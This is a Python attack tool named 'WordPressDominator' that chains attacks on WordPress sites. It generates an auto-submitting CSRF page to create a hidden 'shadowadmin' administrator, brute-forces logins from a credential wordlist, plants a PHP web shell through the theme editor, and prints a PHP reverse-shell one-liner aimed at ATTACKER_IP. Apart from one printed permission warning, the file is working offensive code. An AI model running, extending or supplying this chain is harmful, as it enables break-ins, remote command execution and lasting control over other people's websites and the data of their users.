import requests
import threading
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import os

class WordPressDominator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1"  # Spoofing client IP
        })
        self.domain = urlparse(target_url).netloc

        # Payloads used in attacks
        self.payloads = {
            "backdoor": "<?php system($_GET['cmd']); ?>",
            "reverse_shell": "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        }

    def generate_csrf_html(self):
        """
        Generates an HTML file that attempts CSRF attack to create a new admin user.
        This works if the target WordPress site does not properly verify nonces.
        """
        filename = "csrf_admin_create.html"
        csrf_html = f"""
<html>
  <body>
    <form action="http://{self.domain}/wp-admin/user-new.php" method="POST" id="csrfForm">
      <input type="hidden" name="action" value="createuser">
      <input type="hidden" name="_wpnonce_create-user" value="bYP@ssed">
      <input type="hidden" name="_wp_http_referer" value="/wp-admin/user-new.php">
      <input type="hidden" name="user_login" value="shadowadmin">
      <input type="hidden" name="email" value="legit@trustme.com">
      <input type="hidden" name="pass1" value="P@ssw0rd123!">
      <input type="hidden" name="pass2" value="P@ssw0rd123!">
      <input type="hidden" name="role" value="administrator">
      <input type="hidden" name="send_user_notification" value="0">
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
"""
        with open(filename, "w") as f:
            f.write(csrf_html.strip())

        return f"CSRF payload created: {filename}"

    def brute_force_login(self, wordlist_path):
        """
        Attempts to login using credentials from a wordlist file.
        Uses threads to speed up the process, but throttled to avoid detection.
        Returns list of valid credentials found.
        """
        valid_credentials = []

        def attempt_login(user, pwd):
            try:
                resp = self.session.post(
                    self.target_url,
                    data={"log": user, "pwd": pwd, "wp-submit": "Log In"},
                    timeout=8
                )
                # Check for keywords indicating successful login
                if "dashboard" in resp.url or "admin" in resp.text.lower():
                    valid_credentials.append(f"{user}:{pwd}")
            except requests.RequestException:
                # Ignore connection errors/timeouts
                pass

        # Read wordlist
        with open(wordlist_path, "r") as f:
            creds = [line.strip().split(":", 1) for line in f if ":" in line]

        threads = []
        for username, password in creds[:50]:  # Limit to first 50 entries for demonstration
            t = threading.Thread(target=attempt_login, args=(username, password))
            threads.append(t)
            t.start()
            time.sleep(0.2)  # Slight delay between attempts

        for t in threads:
            t.join(timeout=10)

        return valid_credentials

    def plant_backdoor(self, username, password):
        """
        Logs in using valid credentials, then tries to plant a backdoor PHP shell via
        the WordPress theme editor.
        Returns the URL to access the shell or an error message.
        """
        # Step 1: Login
        login_resp = self.session.post(
            self.target_url,
            data={"log": username, "pwd": password}
        )

        if "dashboard" not in login_resp.url:
            return "Login failed with provided credentials."

        # Step 2: Get nonce for theme editor to authorize edits
        theme_editor_url = f"http://{self.domain}/wp-admin/theme-editor.php?file=404.php"
        resp = self.session.get(theme_editor_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        nonce_input = soup.find("input", {"name": "_wpnonce"})

        if not nonce_input:
            return "Failed to retrieve nonce token from theme editor."

        nonce = nonce_input["value"]

        # Step 3: Prepare data for backdoor injection
        backdoor_code = self.payloads["backdoor"]

        payload = {
            "_wpnonce": nonce,
            "_wp_http_referer": "/wp-admin/theme-editor.php?file=404.php",
            "newcontent": backdoor_code,
            "action": "update",
            "file": "404.php"
        }

        # Step 4: Post the backdoor code
        self.session.post(f"http://{self.domain}/wp-admin/theme-editor.php", data=payload)

        # Return backdoor URL (user must replace THEME_NAME with actual theme folder)
        return f"Backdoor deployed at: http://{self.domain}/wp-content/themes/THEME_NAME/404.php?cmd=whoami"

    def execute_attack(self, wordlist="creds.txt"):
        """
        Runs the full attack chain: CSRF file creation, brute-force login, backdoor planting.
        Returns a detailed report.
        """
        # Step 1: Create CSRF attack file
        csrf_report = self.generate_csrf_html()

        # Step 2: Brute force login
        valid_creds = self.brute_force_login(wordlist)

        if not valid_creds:
            return "Brute-force attack failed: no valid credentials found."

        # Extract first valid credential
        first_cred = valid_creds[0].split(":", 1)
        username, password = first_cred[0], first_cred[1]

        # Step 3: Plant backdoor
        backdoor_report = self.plant_backdoor(username, password)

        return f"""
--- ATTACK REPORT ---
{csrf_report}

Valid credentials found:
{', '.join(valid_creds)}

Backdoor Status:
{backdoor_report}

Reverse Shell Payload:
{self.payloads['reverse_shell']}
"""

if __name__ == "__main__":
    print("WARNING: Use this tool only on WordPress sites you have explicit permission to test!\n")

    target = input("Enter WordPress login URL (e.g. https://example.com/wp-login.php): ").strip()

    if not target:
        print("No URL entered. Exiting.")
        exit(1)

    attacker = WordPressDominator(target)

    if not os.path.exists("creds.txt"):
        with open("creds.txt", "w") as f:
            f.write("admin:password\nadmin:admin\nadmin:P@ssw0rd\n")

    report = attacker.execute_attack()
    print(report)
